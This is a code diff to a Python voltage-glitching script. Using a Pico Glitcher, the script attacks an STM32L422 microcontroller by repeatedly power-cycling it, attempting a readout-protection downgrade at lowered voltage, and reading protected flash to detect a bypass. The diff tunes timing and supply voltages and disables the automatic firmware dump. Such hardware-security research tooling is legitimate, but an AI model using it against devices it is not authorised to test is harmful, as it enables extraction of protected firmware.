@@ -56,6 +56,7 @@ class DerivedDebugInterface(DebugInterface):
 class Main:
     def __init__(self, args):
         self.args = args
+        self.power_cycle_time = 0.5
 
         # logging
         logging.basicConfig(filename="execution.log", filemode="a", format="%(asctime)s %(message)s", level=logging.INFO, force=True)
@@ -64,6 +65,7 @@ class Main:
         self.glitcher = PicoGlitcher()
         # if argument args.power is not provided, the internal power-cycling capabilities of the pico-glitcher will be used. In this case, ext_power_voltage is not used.
         self.glitcher.init(port=args.rpico, ext_power=args.power, ext_power_voltage=3.3)
+        self.ext_power_supply = self.glitcher.get_power_supply()
         #self.glitcher.init(ext_power=args.power, ext_power_voltage=3.3)
 
         # trigger on the rising edge of the reset signal
@@ -83,7 +85,8 @@ class Main:
         # programming the target
         if args.program_target is not None:
             print("[+] Programming target.")
-            self.debugger.program_target(glitcher=self.glitcher, elf_image="toggle-led-stm32l422.elf", rdp_level=args.program_target, verbose=True)
+            self.ext_power_supply.set_voltage(3.3)
+            self.debugger.program_target(glitcher=self.glitcher, elf_image="toggle-led-stm32l422.elf", rdp_level=args.program_target, power_cycle_time=self.power_cycle_time, verbose=True)
 
         # plot the voltage trace while glitching
         # Pico Glitcher
@@ -115,13 +118,16 @@ class Main:
         # - reset and power-cycle
         if rdp == 0xaa or rdp == 0xcc:
             print("[+] Warning: rdp not as expected. Programming target with test program (to flash) and enabling rdp level 1.")
-            self.debugger.program_target(glitcher=self.glitcher, elf_image="toggle-led-stm32l422.elf", unlock=False, rdp_level=1)
+            self.ext_power_supply.set_voltage(3.3)
+            self.debugger.program_target(glitcher=self.glitcher, elf_image="toggle-led-stm32l422.elf", unlock=False, rdp_level=1, power_cycle_time=self.power_cycle_time)
         elif pcrop != 0x00:
             print("[+] Warning: pcrop not as expected. Programming target with test program (to flash) and enabling rdp level 1.")
-            self.debugger.program_target(glitcher=self.glitcher, elf_image="toggle-led-stm32l422.elf", unlock=True, rdp_level=1)
+            self.ext_power_supply.set_voltage(3.3)
+            self.debugger.program_target(glitcher=self.glitcher, elf_image="toggle-led-stm32l422.elf", unlock=True, rdp_level=1, power_cycle_time=self.power_cycle_time)
         elif force:
             print("[+] Programming forced.")
-            self.debugger.program_target(glitcher=self.glitcher, elf_image="toggle-led-stm32l422.elf", unlock=True, rdp_level=1)
+            self.ext_power_supply.set_voltage(3.3)
+            self.debugger.program_target(glitcher=self.glitcher, elf_image="toggle-led-stm32l422.elf", unlock=True, rdp_level=1, power_cycle_time=self.power_cycle_time)
 
         # check if programming was successful (RDP should be active)
         rdp = self.debugger.read_rdp()
@@ -137,6 +143,7 @@ class Main:
         # steps:
         # - init; halt; load_image {elf_image}; resume; exit
         print("[+] Programming target with program to downgrade to RDP 0 (to RAM).")
+        self.ext_power_supply.set_voltage(2.2)
         #self.debugger.load_exec(elf_image="rdp-downgrade-stm32l422.elf", verbose=True)
         self.debugger.attach(delay=0.1)
         #while 1:
@@ -156,7 +163,8 @@ class Main:
         e_delay_between = self.args.delay_between[1]
 
         # bring the target to a known state
-        self.glitcher.power_cycle_reset()
+        self.glitcher.power_cycle_reset(power_cycle_time=self.power_cycle_time)
+        time.sleep(0.5)
 
         experiment_id = 0
         while True:
@@ -175,6 +183,7 @@ class Main:
             self.rdp_downgrade()
 
             # block until glitch
+            memory = None
             response = ""
             try:
                 self.glitcher.block(timeout=1)
@@ -183,7 +192,8 @@ class Main:
                 #    f.write(f"{str(samples)}\n") 
                 #print(samples[0:256])
                 #self.plotter.update_curve(samples)
-                self.glitcher.power_cycle_reset()
+                self.glitcher.power_cycle_reset(power_cycle_time=self.power_cycle_time)
+                time.sleep(0.5)
                 # read from protected address and characterize debugger response
                 memory, response = self.debugger.read_address(address=0x08000000)
                 state = self.debugger.characterize(response=response, mem=memory)
@@ -192,8 +202,8 @@ class Main:
             except Exception as e:
                 print("[-] Timeout received in block(). Continuing.")
                 print(e)
-                self.glitcher.power_cycle_reset()
-                time.sleep(0.2)
+                self.glitcher.power_cycle_reset(power_cycle_time=self.power_cycle_time)
+                time.sleep(0.5)
                 state = b'warning: timeout'
 
             # further check if something changed
@@ -206,20 +216,21 @@ class Main:
 
             # power cycle if error
             if b'error' in state:
-                self.glitcher.power_cycle_reset(0.2)
-                time.sleep(0.2)
+                self.glitcher.power_cycle_reset(power_cycle_time=self.power_cycle_time)
+                time.sleep(0.5)
 
             # dump memory
-            if b'success' in state:
-                self.debugger.read_image(bin_image=f"{Helper.timestamp()}_memory_dump.bin")
-                #self.debugger.telnet_read_image(bin_image=f"{Helper.timestamp()}_memory_dump.bin")
-                state = b'success: dump finished'
+            #if b'success' in state:
+            #    self.debugger.read_image(bin_image=f"{Helper.timestamp()}_memory_dump.bin")
+            #    #self.debugger.telnet_read_image(bin_image=f"{Helper.timestamp()}_memory_dump.bin")
+            #    state = b'success: dump finished'
 
             # classify state
             color = self.glitcher.classify(state)
+            mem_bytes = str(hex(memory) if memory is not None else "None").encode("utf-8")
 
             # add to database
-            state_str = b"state = " + state + b", mem = " + str(hex(memory) if memory is not None else "None").encode("utf-8") + b", response = " + response.encode("utf-8")
+            state_str = b"state = " + state + b", mem = " + mem_bytes + b", response = " + response.encode("utf-8")
             self.database.insert(experiment_id, delay, length, delay_between, color, state_str)
 
             # monitor
@@ -232,8 +243,8 @@ class Main:
             experiment_id += 1
 
             # Dump finished
-            if state == b'success: dump finished':
-                break
+            #if state == b'success: dump finished':
+            #    break
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
